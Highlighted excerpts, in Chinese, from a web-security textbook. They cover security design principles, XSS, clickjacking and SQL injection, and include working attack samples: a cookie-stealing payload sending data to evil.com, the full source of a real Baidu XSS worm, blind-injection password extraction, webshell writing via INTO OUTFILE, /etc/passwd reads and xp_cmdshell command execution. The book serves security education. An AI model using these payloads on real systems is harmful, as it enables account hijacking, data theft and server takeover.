白帽子讲Web安全（纪念版）
吴翰清
448个笔记
第一篇 世界观安全
 
黑客精神所代表的Open、Free、Share，真的一去不复返
 
 
exploit入侵过cia.gov（美国中央情报局）。下面是这个exploit[插图]的一些信息。 root@plac /bin >> ./ssh linux/x86 sshd1 exploit by zip/TESO (zip@james.kalifornia.com) - ripped from openssh 2.2.0 src greets: mray, random, big t, sh1fty, scut, dvorak ps. this sploit already owned cia.gov :/ ＊＊please pick a type＊＊ Usage: ./ssh host [options] Options: -p port -b baseBase address to start bruteforcing distance, by default 0x1800, goes as high as 0x10000 -t type -d debug mode -o Add this to delta_min types: 0: linux/x86 ssh.com 1.2.26-1.2.31 rhl 1: linux/x86 openssh 1.2.3 (maybe others) 2: linux/x86 openssh 2.2.0p1 (maybe others) 3: freebsd 4.x, ssh.com 1.2.26-1.2.31 rhl有趣的是，这个exploit还曾经出现在著名电影《黑客帝国2》
 
 
2003年的冲击波蠕虫是一个里程碑式的事件，这个针对Windows操作系统RPC服务（运行在445端口）的蠕虫，在很短的时间内席卷了全球
 
 
网络运营商们很坚决地在骨干网络上屏蔽了135、445等端口的连接请求。此次事件之后，整个互联网对于安全的重视达到了一个空前的高度。
 
 
PHP语言至今仍然只能靠较好的代码规范来保证没有文件包含漏洞，而无法从语言本身杜绝此类安全问题的发生。
 
 
SQL注入的出现是Web安全史上的一个里程碑，它最早出现大概是在1999年
 
 
XSS（跨站脚本攻击）的出现则是Web安全史上的另一个里程碑。实际上，XSS的出现时间和SQL注入差不多，但是真正引起人们重视则是在大概2003年以后。在经历了MySpace的XSS蠕虫事件
 
 
工程师们很喜欢一句话：“No Patch For Stupid! ”，在安全领域也普遍认为：“最大的漏洞就是人！”
 
 
比学会了“独孤九剑”，天下武功万变不离其宗，遇到任何复杂的情况都可以轻松应对，设计任何的安全方案也都可以信手拈来了。
 
 
Pwn2own竞赛是每年举行的让黑客们任意攻击操作系统的一次盛会，一般黑客们都会提前准备好0day漏洞的攻击程序，以求在Pwn2own上一举夺魁。
 
 
最后将安全的属性总结为安全三要素，简称CIA安全三要素是安全的基本组成元素，分别是机密性（Confidentiality）、完整性（Integrity）、可用性（Availability）。机密性要求保护数据内容不能泄露，加密是实现机密性要求的常见手段。
 
 
威胁建模的方法，它最早是由微软提出的，叫做STRIDE模型。STRIDE是6个单词的首字母缩写，我们在分析威胁时
 
 
6个方面去考虑。[插图]
 
 
要尽可能地不遗漏威胁，头脑风暴的过程可以确定攻击面（Attack Surface）。
 
 
风险由以下因素组成： Risk = Probability ＊ Damage Potential影响风险高低的因素
 
 
DREAD也是几个单词的首字母缩写，它指导我们应该从哪些方面去判断一个威胁的风险程度。[插图]在DREAD模型里，每一个因素都可以分为高、中、低三个等级。
 
 
最基本也最重要的原则就是“Secure by Default”。在做任何安全设计时，都要牢牢记住这个原则
 
 
Secure By Default的另一层含义就是“最小权限原则”。最小权限原则也是安全设计的基本原则之一。
 
 
Defense in Depth（纵深防御）也是设计安全方案时的重要指导思想。纵深防御包含两层含义：首先，要在各个不同层面、不同方面实施安全方案，避免出现疏漏，不同安全方案之间需要相互配合，构成一个整体；
 
 
一开始的方案中，主要是过滤一些特殊字符，比如：<<笑傲江湖>> 会变成 笑傲江湖尖括号被过滤掉了。但是这种粗暴的做法常常会改变用户原本想表达的意思，比如：1<2 可能会变成 1 2
 
 
TM，全称是“统一威胁管理”（Unified Threat Management）。UTM几乎集成了所有主流安全产品的功能，比如防火墙、VPN、反垃圾邮件、IDS、反病毒等。
 
 
Web安全中，由“注入”引起的问题比比皆是，如XSS、SQL Injection、CRLF Injection、X-Path Injection等。此类问题均可以根据“数据与代码分离原则”设计出真正安全的解决方案
 
 
从而导致漏洞。这是操作系统的问题，谁叫操作系统在遍历文件路径时会被0字节截断，谁叫C语言的string操作是以0字节为结束符，谁叫程序员写出这么小白的代码，官方文档里已经提醒过了，关PHP什么事情，太冤枉了！
第二篇 客户端脚本安全
 
因此W3C委员会制定了XMLHttpRequest跨域访问标准。它需要通过目标域返回的HTTP头来授权是否允许跨域访问，因为HTTP头对于JavaScript来说一般是无法控制的
 
 
比如在Windows系统中，浏览器密切结合DEP、ASLR、SafeSEH等操作系统提供的保护技术，对抗内存攻击。
 
 
Google Chrome的Sandbox架构
 
 
IE 8的架构多进程架构最明显的一个好处是，相对于单进程浏览器，在发生崩溃时，多进程浏览器只会崩溃当前的Tab页
 
 
浏览器都开始支持EV SSL证书（Extended Validation SSL Certificate），以增强对安全网站的识别。
 
 
。EVSSL证书也遵循X509标准，并向前兼容普通证书。如果浏览器不支持EV模式，则会把该证书当做普通证书
第3章 跨站脚本攻击（XSS）
 
跨站脚本攻击，英文全称是Cross Site Script，本来缩写是CSS，但是为了和层叠样式表（Cascading Style Sheet, CSS）有所区别，所以在安全领域叫做“XSS
 
 
第一种类型：反射型XSS反射型XSS只是简单地把用户输入的数据“反射”给浏览器。也就是说，黑客往往需要诱使用户“点击”一个恶意链接，才能攻击成功。
 
 
第二种类型：存储型XSS存储型XSS会把用户输入的数据“存储”在服务器端。这种XSS具有很强的稳定性。
 
 
第三种类型：DOM Based XSS实际上，这种类型的XSS并非按照“数据是否保存在服务器端”来划分，DOM Based XSS从效果上来说也是反射型XSS。
 
 
一个最常见的XSS Payload，就是通过读取浏览器的Cookie对象，从而发起“Cookie劫持”攻击。
 
 
攻击者先加载一个远程脚本： http://www.a.com/test.htm? abc=">
 
 
在evil.js中，可以通过如下代码窃取Cookie： var img = document.createElement("img"); img.src = "http://www.evil.com/log? "+escape(document.cookie); document.body.appendChild(img);
 
 
事实上，http://www.evil.com/log并不一定要存在，因为这个请求会在远程服务器的Web日志中留下记录： 127.0.0.1- - [19/Jul/2010:11:30:42 +0800] "GET /log? cookie1%3D1234 HTTP/1.1" 404288这样，就完成了一个最简单的窃取Cookie的XSS Payload。
 
 
在Firefox中访问用户的百度空间，登录后查看当前的Cookie：[插图]查看当前页面的Cookie值然后打开IE，访问同一个页面。此时在IE中，用户是未登录状态：[插图]用户处于未登录状态将Firefox中登录后的Cookie记录下来，并以之替换当前IE中的Cookie。重新发送这个包：[插图]使用同一Cookie值重新发包通过返回的页面可以看到，此时已经登录进该账户：[插图]返回登录后的状态页面验证一下，把返回的HTML
 
 
Cookie的“HttpOnly”标识可以防止“Cookie劫持”，我们将在稍后的章节中再具体介绍。
 
 
有的网站则可能会把Cookie与客户端IP绑定（相关内容在“XSS的防御”一节中会具体介绍），从而使得XSS窃取的Cookie失去意义。
 
 
假设Sohu博客所在域的某页面存在XSS漏洞，那么通过JavaScript，这个过程如下。正常删除该文章的链接是： http://blog.sohu.com/manage/entry.do? m=delete&id=156713012对于攻击者来说，只需要知道文章的id，就能够通过这个请求删除这篇文章了。在本例中，文章的id是156713012。攻击者可以通过插入一张图片来发起一个GET请求： var img = document.createElement("img"); img.src = "http://blog.sohu.com/manage/entry.do? m=delete&id=156713012"; document.body.appendChild(img);
 
 
所以，XSS Payload的思路是先获取到sid的值，然后构造完整的URL，并使用XMLHttpRequest请求此URL，应该就能得到邮件列表
 
 
对于验证码，XSS Payload可以通过读取页面内容，将验证码的图片URL发送到远程服务器上来实施——攻击者可以在远程XSS后台接收当前验证码，并将验证码的值返回给当前的XSS Payload，从而绕过验证码
 
 
实现思路很简单：利用JavaScript在当前页面上“画出”一个伪造的登录框
 
 
通过分辨这些浏览器之间的差异，就能准确地判断出浏览器版本，而几乎不会误报。
 
 
浏览器对象。安全研究者Gareth Heyes曾经找到一种更巧妙的方法[插图]，通过很精简的代码，即可识别出不同的浏览器。 //Firefox detector 2/3 by DoctorDan FF=/a/[-1]=='a' //Firefox 3 by me:- FF3=(function x(){})[-5]=='x' //Firefox 2 by me:- FF2=(function x(){})[-6]=='x' //IE detector I posted previously IE='\v'=='v' //Safari detector by me Saf=/a/.__proto__=='//' //Chrome by me Chr=/source/.test((/a/.toString+'')) //Opera by me Op=/^function \(/.test([].sort) //IE6 detector using conditionals try {IE6=@cc_on @_jscript_version <= 5.7&&@_jscript_build<10000
 
 
在IE中，可以通过判断ActiveX控件的classid是否存在，来推测用户是否安装了该软件。这种方法很早就被用于“挂马攻击”
 
 
一些第三方软件也可能会泄露一些信息。比如Flash有一个system.capabilities对象，能够查询客户端电脑中的硬件信息
 
 
SS History Hack我们再看看另外一个有趣的XSS Payload——通过CSS，来发现一个用户曾经访问过的网站。
 
 
如果用户曾经访问过某个链接，那么这个链接的颜色会变得与众不同： 曾经访问过的 未曾访问过的 
 
 
for (var i = 0; i < websites.length; i++) { /＊ create the new anchor tag with the appropriate URL information ＊/ var link = document.createElement("a"); link.id = "id" + i; link.href = websites[i]; link.innerHTML = websites[i]; /＊ create a custom style tag for the specific link. Set the CSS visited selector to a known value, in this case red ＊/ document.write(''); /＊ quickly add and remove the link from the DOM with enough time to save the visible computed color. ＊/ document.body.appendChild(link); var color = document.defaultView.getComputedStyle(link, null).getPropertyValue("color"); document.body.removeChild(link); /＊ check to see if the link has been visited if the computed color is red ＊/ if (color == "rgb(255, 0, 0)") { // visited /＊ add the link to the visited list ＊/ var item = document.createElement('li'); item.appendChild(link); document.getElementById('visited').appendChild(item); } else { // not visited
 
 
/＊ add the link to the not visited list ＊/ var item = document.createElement('li'); item.appendChild(link); document.getElementById('notvisited').appendChild(item); } // end visited color check if } // end URL loop // --> 
 
 
JavaScript本身并没有提供获取本地IP地址的能力，有没有其他办法？一般来说，XSS攻击需要借助第三方软件来完成。比如，客户端安装了Java环境（JRE）
 
 
Metasploit引擎曾展示过一个强大的测试页面，综合了Java Applet、Flash、iTunes、Office Word、QuickTime等第三方软件的功能，抓取用户的本地信息
 
 
下面就介绍几个常见的XSS攻击平台。Attack APIAttack API[插图]是安全研究者pdp所主导的一个项目
 
 
BeEFBeEF[插图]曾经是最好的XSS演示平台。不同于Attack API, BeEF所演示的是一个完整的XSS攻击过程。
 
 
XSS-ProxyXSS-Proxy是一个轻量级的XSS攻击平台，通过嵌套iframe的方式可以实时地远程控制被XSS攻击的浏览器
 
 
XSS-Proxy的实现原理这些XSS攻击平台有助于深入理解XSS的原理和危害
 
 
XSS WormXSS也能形成蠕虫吗？我们知道，以往的蠕虫是利用服务器端软件漏洞进行传播的
 
 
其次，MySpace同时还过滤了“javascript”、“onreadystatechange”等敏感词，所以Samy用了“拆分法”绕过这些限制
 
 
一般来说，用户之间发生交互行为的页面，如果存在存储型XSS，则比较容易发起XSS Worm攻击。
 
 
这个百度XSS Worm的源代码如下： window.onerror = killErrors; execScript(unescape('Function%20URLEncoding%28vstrIn%29%0A%20%20%20%20strReturn%20%3D %20%22%22%0A%20%20%20%20For%20aaaa%20%3D%201%20To%20Len%28vstrIn%29%0A%20%20%20%20%20 %20%20%20ThisChr%20%3D%20Mid%28vStrIn%2Caaaa%2C1%29%0A%20%20%20%20%20%20%20%20If%20Ab s%28Asc%28ThisChr%29%29%20%3C%20%26HFF%20Then%0A%20%20%20%20%20%20%20%20%20%20%20%20s trReturn%20%3D%20strReturn%20%26%20ThisChr%0A%20%20%20%20%20%20%20%20Else%0A%20%20%20 %20%20%20%20%20%20%20%20%20innerCode%20%3D%20Asc%28ThisChr%29%0A%20%20%20%20%20%20%20 %20%20%20%20%20If%20innerCode%20%3C%200%20Then%0A%20%20%20%20%20%20%20%20%20%20%20%20 %20%20%20%20innerCode%20%3D%20innerCode%20+%20%26H10000%0A%20%20%20%20%20%20%20%20%20 %20%20%20End%20If%0A%20%20%20%20%20%20%20%20%20%20%20%20Hight8%20%3D%20%28innerCode%2 0%20And%20%26HFF00%29%5C%20%26HFF%0A%20%20%20%20%20%20%20%20%20%20%20%20Low8%20%3D%20 innerCode%20And%20%26HFF%0A%20%20%20%20%20%20%20%20%20%20%20%20strReturn%20%3D%20strR eturn%20%26%20%22%25%22%20%26%20Hex%28Hight8%29%20%26%20%20%22%25%22%20%26%20Hex%28Lo w8%29%0A%20%20%20%20%20%20%20%20End%20If%0A%20%20%20%20Next%0A%20%20%20%20URLEncoding %20%3D%20strReturn%0AEnd%20Function'), 'VBScript'); cookie=''; cookieval=document.cookie; spaceid=spaceurl; myhibaidu="http://hi.baidu.com"+spaceid; xmlhttp=poster(); debug=0; online(); if(spaceid! ='/') { if(debug==1) { goteditcss(); document.cookie='xssshell/owned/you! '; } if(cookieval.indexOf('xssshell')==-1) { goteditcss(); document.cookie='xssshell/owned/you! '; } } function makeevilcss(spaceid, editurl, use){ playload="a{evilmask:ex/＊exp/＊＊/ression＊/pression(execScript(unescape('d%253D%2522doc %2522%252B%2522ument%2522%253B%250D%250Ai%253D%2522function%2520load%2528%2529%257Bva r%2520x%253D%2522%252Bd%252B%2522.createElement%2528%2527SCRIPT%2527%2529%253Bx.src%2 53D%2527http%253A//www.18688.com/cache/1.js%2527%253Bx.defer%253Dtrue%253B%2522%252Bd %252B%2522.getElementsByTagName%2528%2527HEAD%2527%2529%255B0%255D.appendChild%2528x% 2529%257D%253Bfunction%2520inject%2528%2529%257Bwindow.setTimeout%2528%2527load%2528% 2529%2527%252C1000%2529%257D%253Bif%2528window.x%2521%253D1%2529%257Bwindow.x%253D1%2 53Binject%2528%2529%257D%253B%2522%250D%250AexecScript%2528i%2529')))}"; action=myhibaidu+"/commit"; spCssUse=use; s=getmydata(editurl); re = /\
 
 
re = /\([^\x00]＊? )\<\/textarea\>/i; spCssText = s.match(re); spCssText=spCssText[2]; spCssText=URLEncoding(spCssText); if(spCssText.indexOf('evilmask')! ==-1) { return 1; } else spCssText=spCssText+"\r\n\r\n"+playload; re = /\[          ]/i; spCssName = s.match(re); spCssName=spCssName[2]; re = /\[          ]/i; spCssTag = s.match(re); spCssTag=spCssTag[2]; postdata="ct="+ct+"&spCssUse=1"+"&spCssColorID=1"+"&spCssLayoutID=-1"+"&spRefURL="+UR LEncoding(spRefUrl)+"&spRefURL="+URLEncoding(spRefUrl)+"&cm="+cm+"&spCssID="+spCssID+ "&spCssText="+spCssText+"&spCssName="+URLEncoding(spCssName)+"&spCssTag="+URLEncoding (spCssTag); result=postmydata(action, postdata); sendfriendmsg(); count(); hack(); } function goteditcss() { src="http://hi.baidu.com"+spaceid+"/modify/spcrtempl/0"; s=getmydata(src); re = /\/i; r = s.match(re); nowuse=r[2]; makeevilcss(spaceid, "http://hi.baidu.com"+spaceid+"/modify/spcss/"+nowuse+".css/edit" ,1); return 0; } function poster(){ var request = false; if(window.XMLHttpRequest) { request = new XMLHttpRequest(); if(request.overrideMimeType) { request.overrideMimeType('text/xml'); } } else if(window.ActiveXObject) { var versions = ['Microsoft.XMLHTTP', 'MSXML.XMLHTTP', 'Microsoft.XMLHTTP', 'Msxml2.XMLHTTP.7.0', 'Msxml2.XMLHTTP.6.0', 'Msxml2.XMLHTTP.5.0', 'Msxml2.XMLHTTP.4.0', 'MSXML2.XMLHTTP.3.0', 'MSXML2.XMLHTTP']; for(var i=0; i
 
return xmlhttp.responseText; } function killErrors() { return true; } function count() { a=new Image(); a.src='http://img.users.51.la/1563171.asp'; return 0; } function online() { online=new Image(); online.src='http://img.users.51.la/1563833.asp '; return 0; }
 
 
function hack() { return 0; } function sendfriendmsg(){ myfurl=myhibaidu+"/friends"; s=getmydata(myfurl); evilmsg="哈，节日快乐呀！热烈庆祝2008，心情好好，记得要想我呀！ \r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n"+myhibai du; var D=function(A, B){A[A.length]=B; }; re = /(.+)D\(k\, \[([^\]]+? )\]\)(.＊)/g; friends = s.match(re); eval(friends[0]); for(i in k) { eval('msgimg'+i+'=new Image(); '); eval('msgimg'+i+'.src="http://msg.baidu.com/? ct=22&cm=MailSend&tn=bmSubmit&sn="+URLE ncoding(k[i][2])+"&co="+URLEncoding(evilmsg)+"&vcodeinput="; '); } }后来又增加了一个传播函数，不过那个时候百度已经开始屏蔽此蠕虫了： function onlinemsg(){ doit=Math.floor(Math.random() ＊ (600 + 1)); if(doit>500) { evilonlinemsg="哈哈，还记得我不，加个友情链接吧？\r\n\r\n\r\n我的地址是"+myhibaidu; xmlDoc=new ActiveXObject("Microsoft.XMLDOM"); xmlDoc.async=false; xmlDoc.load("http://hi.baidu.com/sys/file/moreonline.xml"); online=xmlDoc.documentElement; users=online.getElementsByTagName("id"); x=Math.floor(Math.random() ＊ (200 + 1)); eval('msgimg'+x+'=new Image(); '); eval('msgimg'+x+'.src="http://msg.baidu.com/? ct=22&cm=MailSend&tn=bmSubmit&sn= "+URLEncoding(users[x].text)+"&co="+URLEncoding(evilonlinemsg)+"&vcodeinput="; '); } }
 
 
HttpWatchHttpWatch是一个商业软件，它以插件的形式内嵌在浏览器中。
 
 
“百度搜藏” 曾经出现过一个这样的XSS漏洞。百度在一个希望达到的输出效果是： " />假设长度限制为20个字节，则这段XSS会被切割为： $var输出为： ">最终的效果是：
 
 
使用标签标签并不常用，它的作用是定义页面上的所有使用“相对路径”
 
 
攻击者如果在页面中插入了标签，就可以通过在远程服务器上伪造图片、链接或脚本，劫持当前页面中的所有使用“相对路径”的标签。比如： …. ….  … auth
 
 
document对象，因此很多时候window对象不受同源策略的限制。攻击者利用这个对象，可以实现跨域、跨页面传递数据
 
 
使用window.name可以缩短XSS Payload的长度，如下所示： 
 
 
Apache Expect Header XSS“Apache Expect Header XSS”漏洞最早公布于2006年。这个漏洞曾一度被认为是无法利用的，所以厂商不认为这是个漏洞。这个漏洞的影响范围是：Apache Httpd Server版本1.3.34、2.0.57、2.2.1及以下
 
 
注意到服务器在出错返回时，会把Expect头的内容未经任何处理便写入到页面中
 
 
攻击过程可以看出，需要在提交请求时向HTTP头中注入恶意数据，才能触发这个漏洞
 
 
Flash中发送HTTP请求时，可以自定义大多数的HTTP头。如下是Amit Klein的演示代码
 
 
Flash在新版本中禁止用户自定义发送Expect头。但后来发现可以通过注入HTTP头的方式绕过这个限制： req.addRequestHeader("Expect:FooBar", "");
 
 
回旋镖的思路就是：如果在B域上存在一个反射型“XSS_B”，在A域上存在一个存储型“XSS_A”，当用户访问A域上的“XSS_A”时，同时嵌入B域上的“XSS_B”，则可以达到在A域的XSS攻击B域用户的目的。
 
 
IE中，
 
 
得Tweet按钮被点击劫持。当用户在测试页面点击一个可见的button时，实际上却在不经意间发送了一条微博。
 
 
游戏中的某些点击是有意义的，某些点击是无效的。攻击通过诱导用户鼠标点击的位置，能够完成一些较为复杂的流程。
 
 
 
 
 
XSIO不同于XSS，它利用的是图片的style，或者能够控制CSS。如果应用没有限制style的position为absolute的话，图片就可以覆盖到页面上的任意位置，形成点击劫持。
 
 
构造代码如下：  一张头像图片被覆盖到logo处：
 
 
需要检查用户提交的HTML代码中， 标签的style属性是否可能导致浮出。
 
 
“拖拽劫持”的思路是诱使用户从隐藏的不可见iframe中“拖拽”出攻击者希望得到的数据，然后放到攻击者能控制的另外一个页面中，从而窃取数据。
 
 
触屏劫持到了2010年9月，智能手机上的“触屏劫持”攻击被斯坦福的安全研究者[插图]公布，这意味着ClickJacking的攻击方式更进一步。安全研究者将这种触屏劫持称为TapJacking。
 
 
可能会对应以下几个事件：❍ touchstart，手指触摸屏幕时发生；❍ touchend，手指离开屏幕时发生；❍ touchmove，手指滑动时发生；❍ touchcancel，系统可取消touch事件。通过将一个不可见的iframe覆盖到当前网页上，可以劫持用户的触屏操作。[插图]
 
 
rame busting通常可以写一段JavaScript代码，以禁止iframe的嵌套。这种方法叫frame busting。比如下面这段代码： if ( top.location ! = location ) { top.location = self.location; }
 
 
if (top ! = self) if (top.location ! = self.location) if (top.location ! = location) if (parent.frames.length > 0) if (window ! = top) if (window.top ! == window.self) if (window.self ! = window.top) if (parent && parent ! = window) if (parent && parent.frames && parent.frames.length>0) if((self.parent&&! (self.parent===self))&&(self.parent.frames.length! =0)) top.location = self.location top.location.href = document.location.href top.location.href = self.location.href top.location.replace(self.location) top.location.href = window.location.href top.location.replace(document.location) top.location.href = window.location.href top.location.href = "URL" document.write('') top.location = location top.location.replace(document.location) top.location.replace('URL') top.location.href = document.location top.location.replace(window.location.href) top.location.href = location.href self.parent.location = document.location parent.location.href = self.document.location top.location.href = self.location top.location = window.location top.location.replace(window.location.pathname) window.top.location = window.self.location setTimeout(function(){document.body.innerHTML=''; },1); window.self.onload = function(evt){document.body.innerHTML=''; } var url = window.location.href; top.location.replace(url)但是frame busting也存在一些缺陷。由于它是用JavaScript写的，控制能力并不是特别强，因此有许多方法可以绕过它。
 
 
假设frame busting代码如下： if ( top.location ! = self.location) { parent.location = self.location ; }那么通过以下方式即可绕过上面的保护代码： Attacker top frame: 毫无疑问，iframe的sandbox属性将极大地增强应用使用iframe的安全性
 
 
Link Types: noreferrer在HTML 5中为标签和标签定义了一个新的Link Types:noreferrer。顾名思义，标签指定了noreferrer后，浏览器在请求该标签指定的地址时将不再发送Referer。 test这种设计是出于保护敏感信息和隐私的考虑。因为通过Referer，可能会泄露一些敏感信息
 
 
通过Canvas自动破解验证码，最大的好处是可以在浏览器环境中实现在线破解，大大降低了攻击的门槛
 
 
服务器www.b.com返回一个HTTP Header： Access-Control-Allow-Origin: http://www.a.com
 
 
Origin Header用于标记HTTP发起的“源”，服务器端通过识别浏览器自动带上的这个Origin Header，来判断浏览器的请求是否来自一个合法的“源”。Origin Header可以用于防范CSRF，它不像Referer那么容易被伪造或清空。在上面的例子中，服务器端返回： Access-Control-Allow-Origin: ＊从而允许客户端的跨域请求通过。在这里使用了通配符“*”
 
 
Web Storage呢？过去在浏览器里能够存储信息的方法有以下几种：❍ Cookie❍ Flash Shared Object❍ IE UserData
 
 
Web Storage分为Session Storage和Local Storage。Session Storage关闭浏览器就会失效，而Local Storage则会一直存在。
第三篇 服务器端应用安全
 
用户输入的数据当做代码执行。这里有两个关键条件，第一个是用户能够控制输入；第二个是原本程序要执行的代码，拼接了用户输入的数据。
 
 
一个SQL注入的典型例子。 var Shipcity; ShipCity = Request.form ("ShipCity"); var sql = "select ＊ from OrdersTable where ShipCity = '" + ShipCity + "'";
 
 
用户输入一段有语义的SQL语句，比如： Beijing'; drop table OrdersTable--那么，SQL语句在实际执行时就会如下： SELECT ＊ FROM OrdersTable WHERE ShipCity = 'Beijing'; drop table OrdersTable--'
 
 
用户构造了恶意数据的结果。回过头来看看注入攻击的两个条件：（1）用户能够控制数据的输入——在这里，用户能够控制变量ShipCity。（2）原本要执行的代码，拼接了用户的输入： var sql = "select ＊ from OrdersTable where ShipCity = '" + ShipCity + "'";这个“拼接”的过程很重要，正是这个拼接的过程导致了代码的注入。
 
 
研究出了“盲注”(Blind Injection)的技巧。所谓“盲注”，就是在服务器没有错误回显时完成的注入攻击。服务器没有错误回显，对于攻击者来说缺少了非常重要的
 
 
执行的SQL语句为： SELECT title, description, body FROM items WHERE ID = 2如果攻击者构造如下的条件语句： http://newspaper.com/items.php? id=2 and 1=2实际执行的SQL语句就会变成： SELECT title, description, body FROM items WHERE ID = 2 and 1=2
 
 
攻击者继续构造如下请求： http://newspaper.com/items.php? id=2 and 1=1当攻击者构造条件“and 1=1”时，如果页面正常返回了，则说明SQL语句的“and”成功执行，那么就可以判断“id”参数存在SQL注入漏洞了。
 
 
攻击者通过简单的条件判断，再对比页面返回结果的差异，就可以判断出SQL注入漏洞是否存在。这就是盲注的工作原理。如下例：
 
 
在这里黑客用了“盲注”的一个技巧：Timing Attack，来判断漏洞的存在。
 
 
MySQL中，有一个BENCHMARK()函数，它是用于测试函数性能的。它有两个参数： BENCHMARK(count, expr)函数执行的结果，是将表达式expr执行count次。比如：
 
 
利用BENCHMARK()函数，可以让同一个函数执行若干次，使得结果返回的时间比平时要长；通过时间长短的变化，可以判断出注入语句是否执行成功。
 
 
比如构造的攻击参数id值为： 1170 UNION SELECT IF(SUBSTRING(current,1,1) = CHAR(119), BENCHMARK(5000000, ENCODE('MSG', 'by 5 seconds')), null) FROM (Select Database() as current) as tbl;这段Payload判断库名的第一个字母是否为CHAR(119)，即小写的w。如果判断结果为真，则会通过BENCHMARK()函数造成较长延时；如果不为真，则该语句将很快执行完
 
 
还可通过以下函数获取到许多有用信息： database() - the name of the database currently connected to. system_user() - the system user for the database. current_user() - the current user who is logged in to the database. last_insert_id() - the transaction ID of the last insert operation on the database.
 
 
比如写入Web目录中，攻击者就有可能下载这些文件： 1170 Union All SELECT table_name, table_type, engine FROM information_schema.tables WHERE table_schema = 'mysql' ORDER BY table_name DESC INTO OUTFILE '/path/location/on/server/www/schema.txt'此外，通过Dump文件的方法，还可以写入一个webshell： 1170 UNION SELECT "",2,3,4 INTO OUTFILE "/var/www/html/temp/c.php" --Timing Attack是盲注的一种高级技巧。在不同的数据库中，都有着类似于BENCHMARK()的函数，
 
 
[插图]更多类似的函数，可以查阅每个数据库软件的手册。
 
 
比如下面这段Payload，如果MySQL的版本是4，则会返回TRUE： http://www.site.com/news.php? id=5 and substring(version,1,1)=4
 
 
利用union select来分别确认表名admin是否存在，列名passwd是否存在： id=5 union all select 1,2,3 from admin id=5 union all select 1,2, passwd from admin
 
 
想要猜解出username和password具体的值，可以通过判断字符的范围，一步步读出来： id=5 and ascii(substring((select concat(username,0x3a, passwd) from users limit 0,1),1,1))>64 /＊ret true)＊/ id=5 and ascii(substring((select concat(username,0x3a, passwd) from users limit 0,1),1,1))>96 /＊ret true＊/ id=5 and ascii(substring((select concat(username,0x3a, passwd) from users limit 0,1),1,1))>100 /＊ret false＊/ id=5 and ascii(substring((select concat(username,0x3a, passwd) from users limit 0,1),1,1))>97 /＊ret false＊/ ... id=5 and ascii(substring((select concat(username,0x3a, passwd) from users limit 0,1),2,1))>64 /＊ret true＊/ ...
 
 
自动化工具来帮助完成整个过程。sqlmap.py[插图]就是一个非常好的自动化注入工具。
 
 
当然这要求当前数据库用户有读写系统相应文件或目录的权限。 … union select 1,1, LOAD_FILE('/etc/passwd'),1,1;如果要将文件读出后，再返回结果给攻击者，则可以使用下面这个技巧： CREATE TABLE potatoes(line BLOB); UNION SELECT 1,1, HEX(LOAD_FILE('/etc/passwd')),1,1 INTO DUMPFILE '/tmp/potatoes'; LOAD DATA INFILE '/tmp/potatoes' INTO TABLE potatoes;
 
 
当前数据库用户有创建表的权限。首先通过LOAD_FILE()将系统文件读出，再通过INTO DUMPFILE将该文件写入系统中，然后通过LOAD DATA INFILE将文件导入创建的表中，最后就可以通过一般的注入技巧直接操作表数据了。
 
 
DUMPFILE适用于二进制文件，它会将目标文件写入同一行内；而OUTFILE则更适用于文本文件。
 
 
利用“用户自定义函数”的技巧，即UDF（User-Defined Functions）来执行命令。在流行的数据库中，一般都支持从本地文件系统中导入一个共享库文件作为自定义函数。使用如下语法可以创建UDF： CREATE FUNCTION f_name RETURNS INTEGER SONAME shared_library
 
 
Marco Ivaldi公布了如下的代码，可以通过UDF执行系统命令
 
 
—通过lib_mysqludf_sys提供的几个函数执行系统命令，其中最主要的函数是sys_eval() 和sys_exec()。
 
 
lib_mysqludf_sys.so上传到数据库能访问到的路径下。在创建UDF之后，就可以使用sys_eval()等函数执行系统命令了。
 
 
在MS SQL Server中，则可以直接使用存储过程“xp_cmdshell”执行系统命令。
 
 
当SQL注入后可以执行多语句的情况下，可以在Oracle中创建Java的存储过程执行系统命令。
 
 
建立数据库账户时应该遵循“最小权限原则”，尽量避免给Web应用使用数据库的管理员权限。
 
 
无数的黑客教程在讲到注入SQL Server时都是使用它执行系统命令： EXEC master.dbo.xp_cmdshell 'cmd.exe dir c:' EXEC master.dbo.xp_cmdshell 'ping '
 
 
如果当前数据库用户拥有sysadmin权限，则可以使用sp_configure（SQL Server 2005与SQL Server 2008）重新开启它；如果在SQL Server 2000中禁用了xp_cmdshell，则可以使用sp_addextendedproc开启它。
 
 
EXEC sp_configure 'show advanced options',1 RECONFIGURE EXEC sp_configure 'xp_cmdshell',1 RECONFIGURE
 
 
可能会产生一些意想不到的漏洞。比如，当MySQL使用了GBK编码时，0xbf27和0xbf5c都会被认为是一个字符（双字节字符）。[插图]
 
 
假如攻击者输入： 0xbf27 or 1=1
 
 
会变成0xbf5c27（“\”的ASCII码为0x5c），但0xbf5c又是一个字符：[插图]因此原本会存在的转义符号“\”，在数据库中就被“吃掉“了
 
 
需要统一数据库、操作系统、Web应用所使用的字符集，以避免各层对字符的理解存在差异。统一设置为UTF-8是一个很好的方法。
 
 
可能会存在字符集攻击。解决方法就是在HTML页面的标签中指定当前页面的charset。
 
 
，Stefan Esser提出了一种名为“SQL Column Truncation[插图]”的攻击方式
 
 
当MySQL的sql-mode设置为default时，即没有开启STRICT_ALL_TABLES选项时，MySQL对于用户插入的超长值只会提示warning，而不是error（如果是error则插入不成功），这可能会导致发生一些“截断”问题。
 
 
sql-mode="STRICT_TRANS_TABLES, NO_AUTO_CREATE_USER, NO_ENGINE_SUBSTITUTION"在strict模式下，因为输入的字符串超出了长度限制，因此数据库返回一个error信息，同时数据插入不成功。
 
 
使用这条SQL语句来验证用户名和密码： SELECT username FROM users WHERE username = ? AND passhash = ?但如果攻击者插入一个同名的数据，则可以通过此认证。在之后的授权过程中，如果系统仅仅通过用户名来进行授权： SELECT ＊ FROM users WHERE username = ?则可能会造成一些越权访问。在这个问题公布后不久，WordPress就出现了一个真实的案例——注册一个用户名为“admin（55个空格）x”的用户，就可以修改原管理员的密码了。
 
 
正确地防御SQL注入本章中分析了很多注入攻击的技巧，从防御的角度来看，要做的事情有两件：（1）找到所有的SQL注入漏洞；（2）修补这些漏洞。解决好这两个问题，就能有效地防御SQL注入攻击。
 
 
